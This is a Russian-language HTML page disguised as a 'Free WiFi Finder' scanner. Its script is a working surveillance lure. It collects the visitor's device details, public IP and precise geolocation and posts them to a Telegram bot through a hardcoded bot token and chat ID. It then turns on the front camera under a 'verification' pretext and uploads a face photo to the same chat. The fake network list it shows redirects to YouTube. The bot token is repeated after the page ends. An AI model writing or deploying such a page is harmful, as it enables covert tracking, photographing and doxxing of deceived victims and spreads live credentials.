<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Finder</title>
    <style>
        body { font-family: Arial; background: #1a237e; color: white; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        button { background: #2196f3; color: white; border: none; padding: 15px; border-radius: 10px; margin: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📶 WiFi Scanner</h1>
        <div id="status">Загрузка...</div>
        <button onclick="testBot()">Тест бота</button>
        <button onclick="startScan()">Начать сканирование</button>
    </div>

    <script>
        // КОНФИГ (ЗАМЕНИ НА СВОЙ НОВЫЙ ТОКЕН!)
        const BOT_TOKEN = "8462856007:AAHTGYvf-lCH7ahVHb4BOK_4AZ5OrQzVnP4"; // Тестовый бот
        const CHAT_ID = "-5162779873"; // Твоя группа
        
        // ПРОВЕРКА ПРИ ЗАГРУЗКЕ
        async function init() {
            const deviceInfo = {
                url: window.location.href,
                userAgent: navigator.userAgent.substring(0, 100),
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString('ru-RU')
            };
            
            document.getElementById('status').textContent = `Устройство: ${deviceInfo.screen}`;
            
            // Авто-тест
            setTimeout(testBot, 2000);
        }
        
        // ТЕСТ БОТА
        async function testBot() {
            try {
                document.getElementById('status').textContent = "Тестируем бота...";
                
                // Простой тест
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                const botInfo = await response.json();
                
                if (botInfo.ok) {
                    document.getElementById('status').textContent = `✅ Бот активен: ${botInfo.result.username}`;
                    
                    // Отправляем тестовое сообщение
                    await sendToTelegram(`🟢 Тест системы\nВремя: ${new Date().toLocaleString()}\nУстройство: ${navigator.userAgent.substring(0, 50)}`);
                    
                } else {
                    document.getElementById('status').textContent = "❌ Бот не доступен";
                }
                
            } catch (error) {
                document.getElementById('status').textContent = `❌ Ошибка: ${error.message}`;
            }
        }
        
        // ОТПРАВКА СООБЩЕНИЯ
        async function sendToTelegram(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                console.log("Отправлено:", data);
                return data.ok;
                
            } catch (error) {
                console.error("Ошибка отправки:", error);
                return false;
            }
        }
        
        // СКАНИРОВАНИЕ
        async function startScan() {
            document.getElementById('status').textContent = "Сбор данных...";
            
            // 1. Собираем данные устройства
            const deviceData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                cookies: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                time: new Date().toISOString()
            };
            
            // 2. Получаем IP
            let ipData = { ip: "Не определен" };
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                ipData = await ipResponse.json();
            } catch (e) {}
            
            // 3. Геолокация
            let locationData = null;
            if (navigator.geolocation) {
                try {
                    locationData = await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            pos => resolve({
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            }),
                            () => resolve(null)
                        );
                    });
                } catch (e) {}
            }
            
            // 4. Формируем сообщение
            let message = `<b>📱 НОВОЕ ПОДКЛЮЧЕНИЕ</b>\n\n`;
            message += `<b>Время:</b> ${new Date().toLocaleString('ru-RU')}\n`;
            message += `<b>Устройство:</b> ${deviceData.userAgent}\n`;
            message += `<b>Экран:</b> ${deviceData.screen}\n`;
            message += `<b>Язык:</b> ${deviceData.language}\n`;
            message += `<b>IP:</b> ${ipData.ip}\n`;
            
            if (locationData) {
                message += `<b>📍 Геолокация:</b>\n`;
                message += `Широта: ${locationData.lat.toFixed(6)}\n`;
                message += `Долгота: ${locationData.lng.toFixed(6)}\n`;
                message += `Точность: ±${Math.round(locationData.accuracy)}м\n`;
            }
            
            message += `\n<b>🔗 Ссылка:</b> ${window.location.href}`;
            
            // 5. Отправляем
            const sent = await sendToTelegram(message);
            
            if (sent) {
                document.getElementById('status').textContent = "✅ Данные отправлены!";
                
                // Показываем камеру
                setTimeout(startCamera, 1000);
            } else {
                document.getElementById('status').textContent = "❌ Ошибка отправки";
            }
        }
        
        // КАМЕРА
        async function startCamera() {
            document.getElementById('status').textContent = "Верификация камерой...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: false 
                });
                
                // Создаем элемент видео
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;
                video.style.width = '100%';
                video.style.height = '300px';
                video.style.borderRadius = '10px';
                video.style.background = '#000';
                
                // Добавляем на страницу
                const container = document.querySelector('.container');
                container.appendChild(video);
                
                // Фото через 3 секунды
                setTimeout(async () => {
                    try {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        
                        // Останавливаем камеру
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Отправляем фото
                        const photoData = canvas.toDataURL('image/jpeg');
                        const blob = await fetch(photoData).then(r => r.blob());
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'face.jpg');
                        formData.append('caption', '📸 Фото верификации');
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        document.getElementById('status').textContent = "✅ Фото отправлено!";
                        showResults();
                        
                    } catch (e) {
                        console.error("Ошибка фото:", e);
                        showResults();
                    }
                }, 3000);
                
            } catch (error) {
                document.getElementById('status').textContent = "📷 Камера недоступна";
                setTimeout(showResults, 2000);
            }
        }
        
        // РЕЗУЛЬТАТЫ
        function showResults() {
            document.getElementById('status').textContent = "✅ Сканирование завершено!";
            
            const results = document.createElement('div');
            results.innerHTML = `
                <h3>Найдены сети:</h3>
                <div style="background:rgba(255,255,255,0.1); padding:15px; border-radius:10px; margin:10px 0;">
                    <strong>Free_WiFi_Public</strong><br>
                    <button onclick="connect()" style="background:#4CAF50; margin-top:10px;">Подключиться</button>
                </div>
            `;
            document.querySelector('.container').appendChild(results);
        }
        
        function connect() {
            alert("Подключение...");
            window.location.href = "https://youtube.com";
        }
        
        // ЗАПУСК
        init();
    </script>
</body>
</html>8462856007:AAHTGYvf-lCH7ahVHb4BOK_4AZ5OrQzVnP4
